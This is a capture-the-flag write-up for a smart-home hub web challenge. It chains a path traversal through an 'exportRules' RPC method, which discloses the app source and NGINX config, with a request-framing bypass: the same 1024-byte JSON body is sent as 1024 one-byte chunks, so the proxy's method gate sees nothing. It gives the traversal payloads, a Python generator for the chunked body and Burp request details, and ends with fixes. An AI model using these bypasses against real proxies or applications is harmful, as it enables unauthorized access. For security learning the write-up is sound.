+++
title = "HopHub HubManager HM-7F3A21C4 | Chunked Body Gate Bypass"
date = "2026-10-01"
tags = ["CTF", "Web", "Chunked-Encoding", "Medium"]
description = "Normal user to front-door unlock: NGINX json_set reads method from $request_body, Flask trusts the proxy, and 1024 one-byte chunks blind the gate while Flask still sees valid JSON."
draft = false
+++

<!-- COVER TODO: save your cover as `feature.png` in this same folder (`hophub-hubmanager/feature.png`). Recommended 1200x630, same as `canon-collapse/feature.png`. Build will pick it up automatically. -->

Hey Everyone, this one is my favorite type of web challenge, no RCE, no SQLi, just two layers disagreeing about the same request bytes. Target is **HubManager 2.4.1** at `http://95.217.6.37:30001/`, box `HM-7F3A21C4`. We start as nobody, we end by making `unlockDoor` hand us the flag.

You only get an IP + port. Box is a smart-home hub simulator:

```text
http://95.217.6.37:30001/
HubManager HM-7F3A21C4 · fw 2.4.1
nginx/1.31.6 + Flask backend, one RPC endpoint: POST /api/v1/rpc
```

**The intended chain is:**

1. Confirm up in Burp, map `POST /api/v1/rpc`.
2. Register normal `role:user`, get `session` cookie.
3. Enumerate with `listCapabilities` — find `unlockDoor/disableAlarm/factoryReset privileged`.
4. Prove direct `unlockDoor` is `403` at proxy.
5. Abuse `exportRules` traversal to read `/app/app.py` + `/etc/nginx/nginx.conf`.
6. Learn gate: `json_set $rpc_method $request_body "method"` + `client_max_body_size 1024`.
7. Burn parser-differential dead ends.
8. Send same 1024B JSON as 1024 one-byte chunks — gate blind, Flask parses, flag in `entry_code`.

# 1. Recon

After login you will see the hub manger:

<img width="1917" height="912" alt="image" src="https://github.com/user-attachments/assets/493b40e1-953d-48ea-9ef1-5e0aa7a37ea5" />

JS on that page does everything via:

```text
POST /api/v1/rpc Content-Type: application/json {"method":"..."}
```

# Enumerate Different Methods

Try one per tab:

```json
{"method":"whoami"}
{"method":"getHubInfo"}
{"method":"listDevices"}
{"method":"listCapabilities"}
{"method":"getState","device":"front_door"}
```

For `listDevices`:

<img width="1490" height="676" alt="image" src="https://github.com/user-attachments/assets/55147e5c-f8eb-47b8-8657-29c884358bf6" />.

For `listCapabilities`:

<img width="1286" height="720" alt="Screenshot 2026-10-01 183535" src="https://github.com/user-attachments/assets/a0dae21f-f9d0-4801-bdee-6713385182f3" />

**What does this mean?**

App tells a low-priv user about privileged methods. `scope` looks like docs, not enforcement. Who blocks us?

## Prove the Gate — Direct unlockDoor = 403

If you tried to send a request, you will get 403:

```json
{"method":"unlockDoor","device":"front_door"}
```

```http
HTTP/1.1 403 Forbidden

{"error":"method not permitted"}
```

# Source Disclosure: exportRules Traversal

Method `exportRules` takes export name and does `join(export_dir, name)` with no `..` check.

```json
{"method":"exportRules","name":"../../../../app/app.py"}
{"method":"exportRules","name":"../../../../etc/nginx/nginx.conf"}
```

<img width="1495" height="742" alt="image" src="https://github.com/user-attachments/assets/fa0fbc74-1b83-4667-afc3-8bef6b0c877c" />

**What does this mean?**

We don't need to guess anymore. The server hands us its own source code and its own proxy config. `app.py` tells us what Flask will accept. `nginx.conf` tells us what NGINX will block. The bug is the gap between them.

# What Flask Does

From `app.py`, Flask does 5 steps in order:

```python
1. body.decode('utf-8')  # must be UTF-8, UTF-16/32 die here
2. json.loads(..., object_pairs_hook=reject_duplicates)  # dup keys -> malformed
3. check top-level keys are in allowlist for that method
4. if method not in [login,register,logout,whoami]: require session
5. dispatch to handler
```

**unlockDoor handler:**

```python
device must exist and type == "lock"  # front_door passes
duration optional, default 60, must be finite float
return {"ok":true, "lock":"released", "entry_code": FLAG}
FLAG = _secret("flag", ...) then unlink(/run/hub/flag)
```

**What does this mean?**

- No role check. scope: "privileged" is just a label, never enforced. Any logged-in user who reaches this function gets the flag.
- Very strict JSON: no duplicates, only method,device,duration, finite numbers only, UTF-8 only.
- /run/hub/flag is deleted after boot. Only copy is in memory. You must call `unlockDoor`.

Flask alone is open. Something in front is stopping us.

# What NGINX Does

**Recovered gate:**

```nginx
client_max_body_size 1024;
client_body_buffer_size 1024;
json_set $rpc_method $request_body "method";
map $rpc_method $is_restricted {
  "unlockDoor" 1;
  "disableAlarm" 1;
  "factoryReset" 1;
  default 0;
}
```

<img width="1492" height="737" alt="image" src="https://github.com/user-attachments/assets/633b9125-737c-4f30-a946-c65b0702ac2b" />

Read it line by line, the bypass comes straight from here:

1. `client_max_body_size 1024;` --> Decoded body > 1024 -> 413. Ours must be <=1024.
2. `client_body_buffer_size 1024;` --> Bodies up to 1024 stay in RAM. Fragmented bodies spill to temp file on disk. Twice 1024 is screaming buffer-boundary — test exactly at 1024.
3. `json_set $rpc_method $request_body "method";` --> Parse in-memory $request_body as JSON, copy method field. Key fact: $request_body is empty when body was written to temp file. No RAM body = nothing to parse = $rpc_method stays empty.
4. `map ... default 0;` --> unlockDoor -> 1 -> 403. Anything else including empty -> 0 -> allow. Fail-open. Missing is treated as safe.

**What does this mean?**

NGINX blocks what it extracted, not what Flask will execute:

Normal Content-Length:

```text
Browser --{"method":"unlockDoor"}--> NGINX sees "unlockDoor" in RAM -> 403
```

**Fragmented chunked:**

```text
Browser --{"method":"unlockDoor"}--> NGINX sees "" on disk -> allow -> Flask sees "unlockDoor" -> 200 + flag
```

Proxy blind, backend seeing. That disagreement is the vulnerability.

# Why JSON Tricks Die

| Payload | Result |
|---|---|
| Same JSON + 979 spaces, Content-Length: 1024 | still 403 — padding alone not bypass |
| `{"method":"unlockDoor","method":"whoami"}` | malformed request — duplicate hook |
| last=unlockDoor dup | 403 — NGINX reads last |
| deep nesting, NaN/Infinity/1e309, surrogates, \u0000 | gate maybe blind, Flask rejects finite/scalar/utf-8 checks |
| CL+TE together | 400 |
| case / %2f / trailing slash | 404 or still blocked |

**What does this mean?**

Everything that blinds NGINX JSON also breaks Flask strict validation. Stop changing JSON meaning. Keep JSON 100% valid, change delivery.

Note: All methods I used to bypass from many resources and techniques inspired from another challenges I solved before.

# The Bypass — Same Body, Different Framing

Insight: $request_body is empty when body spooled to temp file. Chunked bodies skip the allocate one buffer fast path, stream + spill, json_set sees nothing, but proxy still forwards file upstream.

Decoded entity exactly 1024B (under client_max_body_size, not over):

```text
45B  {"method":"unlockDoor","device":"front_door"}
+ 979B trailing spaces — legal JSON whitespace
= 1024B, no duration -> default 60
```

On wire as 1024 x 1-byte chunks:

```text
"1\r\n" + 1 byte + "\r\n" = 6 bytes per chunk
1024*6 + 5 ("0\r\n\r\n") = 6149 wire bytes
```

Generate once for Repeater paste:

```bash
python3 -c "
body=b'{\"method\":\"unlockDoor\",\"device\":\"front_door\"}'+b' '*(1024-45)
open('/tmp/body.bin','wb').write(b''.join(b'1\r\n'+bytes([b])+b'\r\n' for b in body)+b'0\r\n\r\n')
"
wc -c /tmp/body.bin # 6149
```

Repeater setup:

```http
POST /api/v1/rpc HTTP/1.1
Host: 95.217.6.37:30001
Content-Type: application/json
Cookie: session=<yours>
Transfer-Encoding: chunked
Connection: close
```

**NO Content-Length — wrench icon -> UNCHECK Update Content-Length**

Body = raw bytes of /tmp/body.bin, preserve \r\n, no extra newline.

TODO: chunked request headers

Screenshot 10 to insert here — images/10-chunked-request.png:

Repeater request pane: headers show Transfer-Encoding: chunked, Connection: close, NO Content-Length, Cookie: session=.... Body starts with 1\r\n{\r\n1\r\n"\r\n... visible. If Burp wraps, show Hex view first bytes + total wire 6149. Purpose: proves framing, not JSON, is the exploit.

<img width="1130" height="602" alt="image" src="https://github.com/user-attachments/assets/5e5edf1e-7e9b-4894-b2cb-dc08835bd29f" />

**Why it works:**

| Layer | It does | It sees |
|---|---|---|
| NGINX HTTP | de-chunks 1024x1B | decoded 1024B <= max, no 413 |
| NGINX json_set | reads $request_body | missing (file-backed/fragmented) |
| NGINX proxy | forwards from temp file | intact JSON |
| Flask | json.loads flat object | unlockDoor/front_door/60 |

# The Takeaway

Whole challenge is one idea: proxy does not see what backend consumes. Auth from best-effort variable that silently disappears on buffering change = fail-open.

Fix that kills class:

1. Enforce in Flask. privileged must be checked, not listed.
2. Fail closed. Empty method / parse fail / missing $request_body on JSON POST -> 400.
3. Test whole path: CL vs chunked, many-small-chunks, 1023/1024/1025, dup keys, deep JSON, bad unicode.
4. Alert when JSON POST proxied without extracted method.

Wire math: `1024 chunks * 6 + 5 = 6149`.
